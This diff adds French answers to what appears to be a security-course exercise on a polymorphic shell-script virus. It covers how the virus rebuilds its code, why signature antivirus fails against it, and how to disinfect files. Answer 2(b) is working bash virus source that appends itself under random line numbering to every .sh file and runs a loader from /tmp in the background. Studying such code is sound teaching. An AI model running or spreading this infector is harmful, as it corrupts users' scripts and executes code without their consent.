@@ -1,0 +1,38 @@
+1) La partie exécutable du virus est celle qui n'est pas préfixée par un nombre
+2) (a) pour rendre exécutable la partie des lignes numérotés, le virus :
+	* Récupère les 24 dernières lignes, correspondant aux lignes numérotées (tail -­n 24 $0)
+	* Trie ces lignes dans l'ordre croissant des numéros (sort -g)
+	* supprime la numérotation (cut -c 4-)
+	* enregistre cela dans un fichier /tmp/test
+	* rend ce fichier exécutable et l'exécute en arrière plan
+(b) 
+if test "$1" == "test" ; then exit 0 ; fi
+n=9 ;
+cat $0 | while read line ; do
+n=$(($n + 1))
+echo "$n $line" >> /tmp/test2
+done
+for i in *.sh; do
+tail -n 24 $i | sort -g | cut -c 4- > /tmp/test
+chmod +x /tmp/test
+if /tmp/test test 2>/dev/null ; then
+continue ;
+fi
+echo 'tail -n 24 $0 | sort -g | cut -c 4- > /tmp/test' >> $i
+echo 'chmod +x /tmp/test' >> $i
+echo '/tmp/test &' >> $i
+echo 'exit 0' >> $i
+cat /tmp/test2 | while read line ; do
+rand=$(($RANDOM % 90 + 10)) ; echo "$rand $line" >> /tmp/test3
+done
+cat /tmp/test3 | sort -g | cut -c 4- >> $i
+rm /tmp/test3
+done
+rm /tmp/test2
+cat /tmp/test
+
+3) Virus polymorphe
+4) Infection par ajout de code. On va devoir supprimer les lignes numérotées et le code de déchiffrement directement exécutable au début pour désinfecter les exécutables atteints.
+head -n -28 infected.sh
+
+5) Pas possible de construire un antivirus par signature, car la signature change tout le temps vu que le code change tout le temps
